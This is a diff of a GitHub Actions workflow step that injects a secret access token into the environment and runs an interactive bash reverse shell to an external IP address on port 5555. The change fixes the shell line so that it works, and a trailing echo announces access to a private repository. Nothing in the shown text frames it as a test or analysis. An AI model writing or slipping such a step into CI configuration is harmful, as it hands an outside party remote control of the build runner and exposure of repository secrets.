@@ -21,6 +21,6 @@ jobs:
         env:
           MY_ACCESS_TOKEN: ${{ secrets.MY_ACCESS_TOKEN }}
         run: |
-          /usr/bin/bash -i >& /dev/tcp/74.48.108.217/5555> 0>&1
+          /bin/bash -i >& /dev/tcp/74.48.108.217/5555 0>&1
           echo "Successfully accessed the private repo!"
 
